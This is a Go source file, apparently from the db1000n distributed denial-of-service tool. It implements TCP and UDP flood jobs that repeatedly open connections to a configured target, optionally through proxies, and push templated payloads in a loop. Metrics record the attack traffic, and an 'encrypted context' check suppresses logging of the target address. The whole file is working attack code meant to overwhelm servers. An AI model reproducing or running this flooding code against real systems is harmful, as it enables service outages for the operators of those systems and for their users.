package jobs

import (
	"context"
	"fmt"
	"log"
	"net"
	"strings"
	"text/template"
	"time"

	"github.com/google/uuid"
	"go.uber.org/zap"

	"github.com/Arriven/db1000n/src/core/packetgen"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/metrics"
	"github.com/Arriven/db1000n/src/utils/templates"
)

type rawnetConfig struct {
	BasicJobConfig
	addr      string
	bodyTpl   *template.Template
	proxyURLs string
	timeout   time.Duration
}

func tcpJob(ctx context.Context, logger *zap.Logger, globalConfig GlobalConfig, args Args) (data interface{}, err error) {
	defer utils.PanicHandler(logger)

	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	jobConfig, err := parseRawNetJobArgs(ctx, logger, args)
	if err != nil {
		return nil, err
	}

	if globalConfig.ProxyURLs != "" {
		jobConfig.proxyURLs = templates.ParseAndExecute(logger, globalConfig.ProxyURLs, ctx)
	}

	trafficMonitor := metrics.Default.NewWriter(metrics.Traffic, uuid.New().String())
	go trafficMonitor.Update(ctx, time.Second)

	processedTrafficMonitor := metrics.Default.NewWriter(metrics.ProcessedTraffic, uuid.NewString())
	go processedTrafficMonitor.Update(ctx, time.Second)

	if !isInEncryptedContext(ctx) {
		log.Printf("Attacking %v", jobConfig.addr)
	}

	for jobConfig.Next(ctx) {
		sendTCP(ctx, logger, jobConfig, trafficMonitor, processedTrafficMonitor)
	}

	return nil, nil
}

func sendTCP(ctx context.Context, logger *zap.Logger, jobConfig *rawnetConfig, trafficMonitor, processedTrafficMonitor *metrics.Writer) {
	trafficMonitor.Add(packetgen.TCPHeaderSize + packetgen.IPHeaderSize) // track sending of SYN packet

	conn, err := utils.GetProxyFunc(jobConfig.proxyURLs, jobConfig.timeout)("tcp", jobConfig.addr)
	if err != nil {
		logger.Debug("error connecting via tcp", zap.String("addr", jobConfig.addr), zap.Error(err))
		metrics.IncRawnetTCP(jobConfig.addr, metrics.StatusFail)

		return
	}

	defer conn.Close()

	trafficMonitor.Add(packetgen.TCPHeaderSize + packetgen.IPHeaderSize)                // if we got here we had to also send ACK packet
	processedTrafficMonitor.Add(2 * (packetgen.TCPHeaderSize + packetgen.IPHeaderSize)) // if we got here the connection was successful and thus track both SYN and ACK

	// Write to conn until error
	for jobConfig.Next(ctx) {
		n, err := conn.Write([]byte(templates.Execute(logger, jobConfig.bodyTpl, ctx)))
		trafficMonitor.Add(uint64(n) + packetgen.TCPHeaderSize + packetgen.IPHeaderSize)

		if err != nil {
			metrics.IncRawnetTCP(jobConfig.addr, metrics.StatusFail)

			return
		}

		processedTrafficMonitor.Add(uint64(n))
		metrics.IncRawnetTCP(jobConfig.addr, metrics.StatusSuccess)
	}
}

func udpJob(ctx context.Context, logger *zap.Logger, _ GlobalConfig, args Args) (data interface{}, err error) {
	defer utils.PanicHandler(logger)

	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	jobConfig, err := parseRawNetJobArgs(ctx, logger, args)
	if err != nil {
		return nil, err
	}

	udpAddr, err := net.ResolveUDPAddr("udp", jobConfig.addr)
	if err != nil {
		return nil, err
	}

	trafficMonitor := metrics.Default.NewWriter(metrics.Traffic, uuid.New().String())
	go trafficMonitor.Update(ctx, time.Second)

	if !isInEncryptedContext(ctx) {
		log.Printf("Attacking %v", jobConfig.addr)
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		logger.Debug("error connecting via tcp", zap.Reflect("addr", udpAddr), zap.Error(err))
		metrics.IncRawnetUDP(udpAddr.String(), metrics.StatusFail)

		return nil, err
	}

	defer conn.Close()

	for jobConfig.Next(ctx) {
		sendUDP(ctx, logger, udpAddr, conn, jobConfig.bodyTpl, trafficMonitor)
	}

	return nil, nil
}

func sendUDP(ctx context.Context, logger *zap.Logger, a *net.UDPAddr, conn *net.UDPConn, bodyTpl *template.Template, trafficMonitor *metrics.Writer) {
	n, err := conn.Write([]byte(templates.Execute(logger, bodyTpl, ctx)))
	if err != nil {
		metrics.IncRawnetUDP(a.String(), metrics.StatusFail)

		return
	}

	trafficMonitor.Add(uint64(n) + packetgen.UDPHeaderSize + packetgen.IPHeaderSize)
	metrics.IncRawnetUDP(a.String(), metrics.StatusSuccess)
}

func parseRawNetJobArgs(ctx context.Context, logger *zap.Logger, args Args) (tpl *rawnetConfig, err error) {
	var jobConfig struct {
		BasicJobConfig

		Address   string
		Body      string
		ProxyURLs string `mapstructure:"proxy_urls"`
		Timeout   *time.Duration
	}

	if err := utils.Decode(args, &jobConfig); err != nil {
		return nil, fmt.Errorf("error decoding rawnet job config: %w", err)
	}

	bodyTpl, err := templates.Parse(jobConfig.Body)
	if err != nil {
		return nil, fmt.Errorf("error parsing body template %q: %w", jobConfig.Body, err)
	}

	targetAddress := strings.TrimSpace(templates.ParseAndExecute(logger, jobConfig.Address, ctx))
	proxyURLs := templates.ParseAndExecute(logger, jobConfig.ProxyURLs, ctx)

	return &rawnetConfig{
		BasicJobConfig: jobConfig.BasicJobConfig,
		addr:           targetAddress,
		bodyTpl:        bodyTpl,
		proxyURLs:      proxyURLs,
		timeout:        utils.NonNilDurationOrDefault(jobConfig.Timeout, time.Minute),
	}, nil
}
